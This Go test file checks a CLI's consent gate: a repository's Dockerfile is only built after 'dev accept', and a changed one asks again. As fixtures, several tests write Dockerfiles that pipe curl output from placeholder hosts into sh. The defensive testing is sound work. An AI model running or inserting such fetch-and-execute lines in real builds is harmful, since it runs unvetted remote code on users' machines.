package cli

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// writeDockerfile gives the project its own build instructions.
func writeDockerfile(t *testing.T, h *harness, body string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(h.paths.ProjectDir, "Dockerfile"),
		[]byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

// A build runs the repository's instructions over an ordinary network,
// before the sandbox exists. `dev run` means "run this safely" to the
// person typing it, and that is the one moment where it does not.
func TestARepositoryDockerfileIsNotBuiltUntilAccepted(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	writeDockerfile(t, h, "FROM alpine\nRUN curl https://wherever.example | sh\n")

	err := h.run(t, "run", "--tty", "off", "-c", "true")
	if err == nil {
		t.Fatal("a repository's own Dockerfile was built without being accepted")
	}
	for _, args := range h.dockerArgs() {
		if len(args) > 0 && args[0] == "build" {
			t.Fatalf("a build ran anyway:\n%s", argv(args))
		}
	}
	out := h.stderr.String()
	for _, want := range []string{"Dockerfile", "not", "filtered", "dev accept"} {
		if !strings.Contains(out, want) {
			t.Fatalf("the refusal does not explain itself (missing %q):\n%s", want, out)
		}
	}
}

// Accepting is per file: this is the mechanism the other settings already
// use, so a Dockerfile that changes is new instructions and asks again.
func TestAnAcceptedDockerfileBuilds(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	writeDockerfile(t, h, "FROM alpine\n")

	if err := h.run(t, "accept", "--all"); err != nil {
		t.Fatalf("accept: %v", err)
	}
	h.stderr.Reset()
	if err := h.run(t, "run", "--tty", "off", "-c", "true"); err != nil {
		t.Fatalf("run after accepting: %v\n%s", err, h.stderr.String())
	}

	var built bool
	for _, args := range h.dockerArgs() {
		if len(args) > 0 && args[0] == "build" {
			built = true
		}
	}
	if !built {
		t.Fatal("an accepted Dockerfile was still not built")
	}
}

// Changed instructions are a new request. The acceptance carries a digest
// so the existing value-sensitivity does this without new machinery.
func TestAChangedDockerfileAsksAgain(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	writeDockerfile(t, h, "FROM alpine\n")
	if err := h.run(t, "accept", "--all"); err != nil {
		t.Fatal(err)
	}

	writeDockerfile(t, h, "FROM alpine\nRUN curl https://elsewhere.example | sh\n")
	if err := h.run(t, "run", "--tty", "off", "-c", "true"); err == nil {
		t.Fatal("a Dockerfile that changed after acceptance was built without asking")
	}
}

// Choosing the template narrows what runs rather than widening it, so it
// needs no acceptance: someone inspecting an unfamiliar repository should
// not have to accept its Dockerfile in order to avoid building it.
func TestTheTemplateCanBeChosenWithoutAccepting(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	h.writeLanguage(t, "demo", `name: demo
versions: ["1"]
detection:
  files: [demo.toml]
`)
	if err := os.WriteFile(filepath.Join(h.paths.ProjectDir, "demo.toml"),
		[]byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	writeDockerfile(t, h, "FROM alpine\nRUN curl https://wherever.example | sh\n")

	if err := h.run(t, "run", "--build-source", "template", "--tty", "off", "-c", "true"); err != nil {
		t.Fatalf("choosing the template was refused: %v\n%s", err, h.stderr.String())
	}
}

// A project with no Dockerfile of its own asks nothing: the template is
// this tool's file, and nothing about it is the repository's request.
func TestATemplateOnlyProjectNeedsNoBuildConsent(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	h.writeLanguage(t, "demo", `name: demo
versions: ["1"]
detection:
  files: [demo.toml]
`)
	if err := os.WriteFile(filepath.Join(h.paths.ProjectDir, "demo.toml"),
		[]byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := h.run(t, "run", "--tty", "off", "-c", "true"); err != nil {
		t.Fatalf("a template-only project asked for consent: %v\n%s", err, h.stderr.String())
	}
}
